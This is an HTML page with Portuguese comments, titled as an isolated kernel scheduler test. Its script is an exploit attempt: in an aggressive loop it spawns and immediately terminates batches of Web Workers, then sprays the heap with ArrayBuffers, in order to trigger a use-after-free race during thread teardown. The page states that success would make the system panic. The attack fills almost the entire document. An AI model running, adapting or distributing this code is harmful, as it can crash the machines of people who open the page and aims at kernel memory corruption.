<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>IsoTest 06: Kernel Scheduler UAF</title>
<style>
    body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
    button { padding: 15px; background: #333; color: #fff; border: 1px solid #0f0; cursor: pointer; font-size: 16px; margin-bottom: 10px; width: 100%; }
    #log { border: 1px solid #444; height: 400px; overflow-y: scroll; padding: 10px; background: #000; }
    .highlight { color: #ff3333; font-weight: bold; }
</style>
</head>
<body>

<h1>TARGET: KERNEL SCHEDULER (ISOLATED)</h1>
<p>Testando Cenário B: Race Condition durante Thread Teardown</p>
<hr>

<button onclick="startRace()">INICIAR RACE CONDITION (PODE DESLIGAR O CONSOLE)</button>
<button onclick="stopRace()">PARAR TESTE</button>

<div id="log">Aguardando início...</div>

<script>
    let running = false;
    let round = 0;
    
    // Logger visual
    function log(msg, type='') {
        const el = document.getElementById('log');
        const line = document.createElement('div');
        line.innerText = `[R${round}] ${msg}`;
        if(type === 'err') line.className = 'highlight';
        el.appendChild(line);
        el.scrollTop = el.scrollHeight;
    }

    // Payload do Worker:
    // Ele tenta alocar memória e mantê-la ocupada, forçando o Kernel a trabalhar
    // durante o processo de encerramento.
    const workerScript = `
        onmessage = function(e) {
            // Cria pressão na heap
            const junk = new Array(5000).fill(1.1);
            // Tenta responder (mantém canal IPC aberto)
            postMessage('alive');
        };
    `;
    const blob = new Blob([workerScript], {type: 'application/javascript'});
    const workerUrl = URL.createObjectURL(blob);

    // Função para tentar sobrescrever memória liberada (Heap Spray simples)
    function trySpray() {
        const spray = [];
        for(let i=0; i<100; i++) {
            // Tenta alocar objetos de tamanho similar a estruturas de thread (chute educado)
            spray.push(new ArrayBuffer(1024 * 4)); 
        }
        return spray;
    }

    async function raceStep() {
        if(!running) return;
        round++;

        const workers = [];
        const buffers = [];

        // 1. Fase de Alocação Rápida (Spawn)
        // Cria apenas 20 threads para não estourar a RAM, mas estressar o Scheduler
        try {
            for(let i=0; i<25; i++) {
                const w = new Worker(workerUrl);
                workers.push(w);
                
                // Envia uma mensagem para garantir que a thread iniciou e está processando
                // Usamos Transferable (ArrayBuffer) para complexidade de memória
                const buf = new ArrayBuffer(1024);
                buffers.push(buf); // Guarda ref
                w.postMessage(buf, [buf]);
            }
        } catch(e) {
            log("Erro na criação: " + e.message, 'err');
        }

        // Pequeno delay para garantir que as threads estão "Running" no Kernel
        // O crash acontece se matarmos enquanto ela muda de estado (Running -> Terminated)
        await new Promise(r => setTimeout(r, 5));

        // 2. Fase de Destruição e Reutilização (Race)
        // Matamos todos e IMEDIATAMENTE tentamos alocar memória por cima
        try {
            for(let w of workers) {
                w.terminate(); 
            }
            
            // SPRAY IMEDIATO: Se o Kernel liberou a struct da thread mas ainda 
            // tem um ponteiro para ela, tentamos colocar nossos dados lá.
            trySpray(); 
            
            log(`Ciclo ${round}: 25 Threads terminadas + Spray executado.`);
        } catch(e) {
            log("Erro na destruição: " + e.message, 'err');
        }

        // Loop agressivo
        if(running) requestAnimationFrame(raceStep);
    }

    function startRace() {
        if(running) return;
        running = true;
        log("Iniciando Race Condition no Scheduler...");
        log("AVISO: Se bem sucedido, o sistema irá travar (Panic).");
        raceStep();
    }

    function stopRace() {
        running = false;
        log("Teste interrompido pelo usuário.");
    }
</script>

</body>
</html>
